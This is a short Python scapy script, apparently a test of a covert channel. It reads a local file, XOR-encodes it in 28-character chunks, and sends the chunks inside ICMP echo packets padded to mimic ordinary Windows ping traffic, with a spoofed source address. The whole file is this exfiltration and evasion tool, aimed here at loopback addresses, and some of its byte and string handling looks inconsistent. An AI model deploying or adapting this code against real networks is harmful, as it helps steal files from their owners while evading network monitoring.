from time import sleep
from scapy.all import *
from sys import stdout

KEY = "\x13\x14\x15\x16\x17"
FILE = "C:\\Users\\wolfpack270\\Desktop\\gitRepos\\.gitignore"

standard_icmp = "\xe3\xabM]"+"\x00"*4+"~{\x01"+"\x00"*5
for i in range(0x10,0x38):
    standard_icmp+=chr(i)

def build(to_addr,from_addr):
    ip = IP(ttl=128, dst=to_addr,src=from_addr)
    icmp = ICMP(type=8,code=0)
    raw = Raw()
    pkt = ip/icmp/raw
    return pkt

def xor(message,key):
    m = ''
    for i in range(len(message)):
        m+=chr(ord(message[i])^ord(key[i%len(key)]))

    return m

def get_file(file_name):
    data = ''
    try:
        with open(file_name) as f:
            line = f.readline()
            while line:
                data+=line
                line = f.readline()
            return data
    except:
        pass


if __name__ == '__main__':
    p = build('127.0.0.1','127.0.0.2')
    message = get_file(FILE) 
    for i in range(0,len(message),28):
        encoded = xor(message[i:i+28],KEY)
        
        p['Raw'].load=encoded
        for j in range(0x20,0x38):
            p['Raw'].load+=bytes(chr(j),'utf-8')
        if len(p['Raw'].load) < 56:
            p['Raw'].load = bytes(standard_icmp[0:56-len(str(p['Raw'].load))]+str(p['Raw'].load),'utf-8')
        send(p)
        sleep(1)
